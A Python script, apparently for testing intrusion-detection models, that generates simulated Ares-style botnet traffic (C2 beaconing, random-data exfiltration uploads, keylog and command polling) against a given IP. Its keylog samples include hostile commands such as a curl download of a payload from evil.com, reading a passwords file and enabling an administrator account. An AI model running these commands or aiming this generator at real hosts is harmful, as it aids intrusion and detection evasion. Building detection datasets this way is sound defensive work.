"""
Botnet Attack - C2 beaconing, data exfiltration, and command execution
Replicates CIC-IDS2018 Ares botnet behavior:
  - C2 Beaconing:     Periodic HTTP callbacks to command server at regular intervals
  - Data Exfiltration: Upload "stolen" data in large HTTP POST requests
  - Command Execution: Download "commands" via HTTP GET, execute, report back

Key: Botnet traffic differs from normal browsing because of:
  - Periodic beaconing at regular intervals (predictable timing)
  - HTTP POST exfiltration with large payloads (high TotLen Fwd Pkts)
  - Long-lived connections with idle periods (high Idle Mean/Min)
  - Bidirectional traffic on keep-alive connections
  - Different Fwd Seg Size Min from normal browsers
  - Unusual Init Fwd Win Byts values

The old script just sent 30-byte payloads and closed immediately —
each connection looked like a normal HTTP health check.
"""

import socket
import threading
import time
import random
import string
import base64
import json

# TCP receive buffer size matching CICIDS2018 training data.
# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
# which the model uses for classification (Init Fwd Win Byts feature).
_RCVBUF_BOTNET = 8192

USER_AGENTS = [
    # Ares/Zeus bots often use generic or outdated user agents
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
    "Python-urllib/3.8",
    "Wget/1.21",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _random_data(size):
    """Generate random bytes that look like encoded stolen data."""
    raw = ''.join(random.choices(string.ascii_letters + string.digits + "+/=", k=size))
    return raw.encode()


class BotnetAttack:
    def __init__(self, target_ip, duration=60):
        self.target_ip = target_ip
        self.duration = duration
        self.running = True
        self.beacon_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.beacon_count += n

    # ──────────────────────────────────────────────────────
    # C2 Beaconing — Periodic HTTP callbacks
    #   Ares bot checks in with C2 server via HTTP at regular
    #   intervals. Uses keep-alive connections.
    #
    #   CICFlowMeter signature: Long-lived flow with periodic
    #   bursts of traffic, high Idle Mean, moderate packet count,
    #   distinctive User-Agent, consistent intervals.
    # ──────────────────────────────────────────────────────
    def c2_beacon(self):
        """C2 beaconing: Simulates Ares-style HTTP callbacks.
        Opens a persistent connection and sends periodic check-in requests,
        then receives commands. The connection stays alive with idle periods
        between beacons, matching real botnet C2 behavior."""
        end_time = time.time() + self.duration
        c2_port = random.choice([80, 8080])
        bot_id = _random_string(16)

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BOTNET)
                sock.connect((self.target_ip, c2_port))

                # Multiple beacons on same connection (keep-alive)
                beacons_per_conn = random.randint(5, 20)
                for i in range(beacons_per_conn):
                    if not self.running or time.time() >= end_time:
                        break

                    # Beacon check-in (GET with bot ID in URL/cookie)
                    path = f"/api/check?id={bot_id}&seq={i}&t={int(time.time())}"
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Cookie: session={bot_id}\r\n"
                        f"Accept: application/json\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Read C2 response (command)
                    try:
                        sock.settimeout(2)
                        response = sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(15)

                    # Report back result (POST)
                    result_body = json.dumps({
                        "id": bot_id,
                        "status": "ok",
                        "uptime": random.randint(100, 100000),
                        "os": "Windows 10",
                        "hostname": f"PC-{_random_string(6).upper()}",
                    })
                    report_req = (
                        f"POST /api/report HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(result_body)}\r\n"
                        f"Cookie: session={bot_id}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                        f"{result_body}"
                    )
                    sock.sendall(report_req.encode())
                    self._inc_count()

                    try:
                        sock.settimeout(2)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(15)

                    # Wait between beacons (botnet style: regular intervals with jitter)
                    time.sleep(random.uniform(3, 8))

                sock.close()
            except Exception:
                pass

            # Brief pause before reconnecting
            time.sleep(random.uniform(1, 3))

    # ──────────────────────────────────────────────────────
    # Data Exfiltration — Upload "stolen" data
    #   Ares bot exfiltrates data via HTTP POST with large payloads.
    #
    #   CICFlowMeter signature: High TotLen Fwd Pkts, high Fwd
    #   Pkt Len Mean/Max (large uploads), long flow duration,
    #   asymmetric traffic (much more forward than backward).
    # ──────────────────────────────────────────────────────
    def data_exfiltration(self):
        """Data exfiltration: Upload large payloads simulating stolen data.
        Sends multiple large HTTP POST requests on a keep-alive connection,
        mimicking credential dumps, keylogger data, and file exfiltration."""
        end_time = time.time() + self.duration
        exfil_port = random.choice([80, 8080])
        bot_id = _random_string(16)

        # Simulated exfiltration data types
        data_types = ["credentials", "keylog", "clipboard", "screenshots",
                      "browser_history", "cookies", "system_info", "files"]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BOTNET)
                sock.connect((self.target_ip, exfil_port))

                uploads_per_conn = random.randint(3, 10)
                for _ in range(uploads_per_conn):
                    if not self.running or time.time() >= end_time:
                        break

                    data_type = random.choice(data_types)

                    # Generate exfiltration payload (large, base64-encoded "data")
                    if data_type in ("screenshots", "files"):
                        # Large payload (simulate file/screenshot exfil)
                        payload_size = random.randint(4096, 32768)
                    elif data_type in ("credentials", "cookies", "browser_history"):
                        # Medium payload
                        payload_size = random.randint(1024, 8192)
                    else:
                        # Small payload (keylog, clipboard)
                        payload_size = random.randint(256, 2048)

                    exfil_data = _random_data(payload_size)

                    body = (
                        f'{{"id":"{bot_id}","type":"{data_type}",'
                        f'"data":"{base64.b64encode(exfil_data).decode()}",'
                        f'"ts":{int(time.time())}}}'
                    )

                    req = (
                        f"POST /api/upload HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Cookie: session={bot_id}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Read server acknowledgement
                    try:
                        sock.settimeout(2)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(15)

                    # Exfiltration happens in bursts with pauses
                    time.sleep(random.uniform(2, 6))

                sock.close()
            except Exception:
                pass

            time.sleep(random.uniform(3, 8))

    # ──────────────────────────────────────────────────────
    # Keylogger + Command execution loop
    #   Periodically sends small keylog packets and polls
    #   for commands. Creates steady bidirectional flow.
    #
    #   CICFlowMeter signature: Many small forward packets
    #   at regular intervals, moderate backward traffic,
    #   long flow with idle periods.
    # ──────────────────────────────────────────────────────
    def keylog_and_command(self):
        """Keylogger + command polling: sends small keylog packets and
        polls for commands at regular intervals on a persistent connection."""
        end_time = time.time() + self.duration
        bot_id = _random_string(16)
        c2_port = random.choice([80, 8080])

        # Simulated keystrokes (what a keylogger would capture)
        keylog_snippets = [
            "admin password123 enter",
            "https://bank.example.com tab username tab password enter",
            "ssh root@192.168.1.100 enter",
            "SELECT * FROM users WHERE id=1; enter",
            "net user administrator /active:yes enter",
            "type C:\\Users\\admin\\Documents\\passwords.txt enter",
            "curl http://evil.com/payload.exe -o C:\\temp\\update.exe enter",
            "powershell -enc JABjAGwAaQBlAG4AdA enter",
        ]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BOTNET)
                sock.connect((self.target_ip, c2_port))

                cycles_per_conn = random.randint(10, 40)
                for _ in range(cycles_per_conn):
                    if not self.running or time.time() >= end_time:
                        break

                    # Send keylog data
                    keylog = random.choice(keylog_snippets) + f" [{int(time.time())}]"
                    body = json.dumps({"id": bot_id, "keylog": keylog})

                    req = (
                        f"POST /api/keylog HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Poll for command
                    try:
                        sock.settimeout(2)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(15)

                    # Poll C2 for pending commands  
                    cmd_req = (
                        f"GET /api/cmd?id={bot_id} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(cmd_req.encode())
                    self._inc_count()

                    try:
                        sock.settimeout(2)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(15)

                    # Regular interval between cycles (botnet heartbeat)
                    time.sleep(random.uniform(1, 4))

                sock.close()
            except Exception:
                pass

            time.sleep(random.uniform(2, 5))

    def run_attack(self, num_threads=6):
        """Run botnet attack with multiple threads."""
        print(f"[Botnet] Starting attack on {self.target_ip} for {self.duration}s")
        print(f"[Botnet] Techniques: C2 beaconing + Data exfiltration + Keylog/Command")
        print(f"[Botnet] Using {num_threads} threads")

        techniques = [
            self.c2_beacon,
            self.data_exfiltration,
            self.keylog_and_command,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"Botnet-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[Botnet] Completed in {elapsed:.2f}s — Made {self.beacon_count} C2 connections")


def run_botnet(target_ip, duration=60, threads=6):
    """Convenience function to run botnet attack"""
    attack = BotnetAttack(target_ip, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_botnet(target_ip, duration=duration)
    else:
        print("Usage: python _5_botnet_behavior.py <target_ip> [duration]")
